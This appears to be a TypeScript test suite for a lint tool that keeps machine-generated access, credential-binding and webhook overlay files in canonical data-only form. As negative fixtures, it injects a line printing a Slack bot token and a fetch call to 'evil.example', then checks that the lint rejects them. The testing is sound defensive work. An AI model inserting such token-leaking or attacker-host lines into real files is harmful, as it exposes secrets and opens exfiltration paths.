import { spawnSync } from "node:child_process";
import { copyFileSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";

const root = join(dirname(fileURLToPath(import.meta.url)), "..");
const LINT = join(root, "scripts", "overlay-lint.ts");

const LINT_OVERLAYS = [
  "agent/access/grants.generated.ts",
  "agent/access/credential-bindings.generated.ts",
  "agent/webhooks/hooks.generated.ts",
  "agent/memory/agents.generated.ts",
  "agent/identity/groups.generated.ts",
] as const;
const scratchRoot = mkdtempSync(join(tmpdir(), "oe-overlay-lint-"));
for (const rel of LINT_OVERLAYS) {
  mkdirSync(dirname(join(scratchRoot, rel)), { recursive: true });
  copyFileSync(join(root, rel), join(scratchRoot, rel));
}
const trackedBytesAtStart = LINT_OVERLAYS.map((rel) => readFileSync(join(root, rel), "utf8"));

const FETCH_GUARD = pathToFileURL(join(root, "scripts", "fetch-guard-for-tests.mjs")).href;
const FETCH_GUARD_MARKER = "OE_FETCH_GUARD_TRIPPED";

const OVERLAYS = [
  "agent/access/grants.generated.ts",
  "agent/access/credential-bindings.generated.ts",
  "agent/webhooks/hooks.generated.ts",
  "agent/memory/agents.generated.ts",
] as const;

let passed = 0;

function ok(cond: boolean, label: string): void {
  if (!cond) throw new Error(label);
  passed++;
}

function lint(args: readonly string[] = []): { code: number; out: string } {
  const nodeOptions = [process.env.NODE_OPTIONS, `--import ${FETCH_GUARD}`].filter(Boolean).join(" ");
  const r = spawnSync(process.execPath, [join(root, "node_modules", "tsx", "dist", "cli.mjs"), LINT, "--root", scratchRoot, ...args], {
    cwd: root,
    encoding: "utf8",
    env: { ...process.env, NODE_NO_WARNINGS: "1", NODE_OPTIONS: nodeOptions },
  });
  const out = `${r.stdout ?? ""}${r.stderr ?? ""}`;
  ok(!out.includes(FETCH_GUARD_MARKER), `lint(${JSON.stringify(args)}): no real fetch() escaped the run`);
  return { code: r.status ?? -1, out };
}

function withPerturbed(rel: string, mutate: (text: string) => string, fn: (original: string) => void): void {
  const abs = join(scratchRoot, rel);
  const original = readFileSync(abs, "utf8");
  try {
    writeFileSync(abs, mutate(original));
    fn(original);
  } finally {
    writeFileSync(abs, original);
  }
}

function main(): void {
  {
    const clean = lint(["--check"]);
    ok(clean.code === 0, `lint --check is GREEN on the committed tree (exit ${clean.code}; output: ${clean.out.trim()})`);
    ok(clean.out.includes("canonical data"), "…and says so, naming the property it proved");
    const norm = lint([]);
    ok(norm.code === 0 && norm.out.includes("already canonical"), "overlays:normalize is a NO-OP on a canonical tree");
    for (const rel of OVERLAYS) {
      const text = readFileSync(join(scratchRoot, rel), "utf8");
      ok(text.startsWith("// GENERATED + MACHINE-OWNED — DO NOT HAND-EDIT.\n"), `${rel} carries the machine-owned banner`);
      ok(text.endsWith(";\n") && text.split("export default").length === 2, `${rel} is exactly one default-export statement`);
    }
  }

  for (const rel of OVERLAYS) {
    withPerturbed(rel, (t) => t + 'console.log(process.env.SLACK_BOT_TOKEN);\n', () => {
      const r = lint(["--check"]);
      ok(r.code === 1, `🔴 ${rel}: a hand-added line of CODE makes lint --check RED (exit ${r.code})`);
      ok(r.out.includes(rel), `🔴 ${rel}: …and the failure NAMES the file`);
      ok(r.out.includes("exactly one"), `🔴 ${rel}: …and states the grammar it broke`);
      const w = lint([]);
      ok(w.code === 1, `🔴 ${rel}: overlays:normalize REFUSES a code-bearing file rather than stripping the code`);
      ok(readFileSync(join(scratchRoot, rel), "utf8").includes("console.log"), `🔴 ${rel}: …and leaves the file untouched`);
    });
  }
  withPerturbed(OVERLAYS[0], (t) => t.replace("\nexport default {", '\nglobalThis.x = fetch("https://evil.example");\nexport default {'), () => {
    const r = lint(["--check"]);
    ok(r.code === 1, "🔴 a statement injected BEFORE the data makes lint --check RED");
    ok(r.out.includes("does not start with the generated header"), "…naming the prefix it broke");
  });
  withPerturbed(OVERLAYS[0], (t) => t.replace("DO NOT HAND-EDIT.", "hand-edits welcome."), () => {
    ok(lint(["--check"]).code === 1, "🔴 deleting the DO-NOT-HAND-EDIT banner makes lint --check RED");
  });

  {
    const rel = OVERLAYS[0];
    withPerturbed(rel, (t) => t.replace('  "bundles"', '      "bundles"'), (original) => {
      const r = lint(["--check"]);
      ok(r.code === 1, "a hand-re-indented body makes lint --check RED");
      ok(r.out.includes("not in canonical form"), "…and says the file is not canonical");
      ok(r.out.includes("overlays:normalize"), "…and names the recovery command");
      const w = lint([]);
      ok(w.code === 0 && w.out.includes("normalised 1 overlay"), "overlays:normalize REPAIRS data-only drift");
      ok(readFileSync(join(scratchRoot, rel), "utf8") === original, "…restoring the exact canonical bytes");
      ok(lint(["--check"]).code === 0, "…and the tree is GREEN again afterwards");
    });
  }

  {
    const rel = OVERLAYS[1];
    const abs = join(scratchRoot, rel);
    const original = readFileSync(abs, "utf8");
    try {
      writeFileSync(abs, "");
      const r = lint(["--check"]);
      ok(r.code === 1, "an EMPTY overlay file makes lint --check RED (absence is not an empty overlay)");
      ok(r.out.includes(rel), "…naming the file");
    } finally {
      writeFileSync(abs, original);
    }
    ok(lint(["--check"]).code === 0, "…and the restored tree is GREEN");
  }

  withPerturbed(OVERLAYS[0], (t) => t.replace('"bundles": []', '"bundles": [\n    {\n      "name": "sneaky"\n    }\n  ]'), () => {
    const r = lint(["--check"]);
    ok(r.code === 1, "data that the codemod's strict parser rejects makes lint --check RED");
    ok(r.out.includes("grants:"), "…with the parser's own message, not a generic one");
    ok(lint([]).code === 1, "…and overlays:normalize refuses it rather than inventing valid data");
  });

}

try {
  main();
} catch (err) {
  console.error(`✗ ${err instanceof Error ? err.message : String(err)}`);
  console.error(`  (${passed} assertion(s) passed before the failure; the overlay files have been restored)`);
  process.exit(1);
}

for (const [i, rel] of LINT_OVERLAYS.entries()) {
  ok(readFileSync(join(root, rel), "utf8") === trackedBytesAtStart[i], `tracked ${rel} is byte-identical after the suite (perturbations stayed in the scratch copy)`);
}
rmSync(scratchRoot, { recursive: true, force: true });

console.log(`\n✓ overlay drift lint: ${passed} assertions passed (${OVERLAYS.length} machine-owned overlays, perturbed only as scratch copies)\n`);
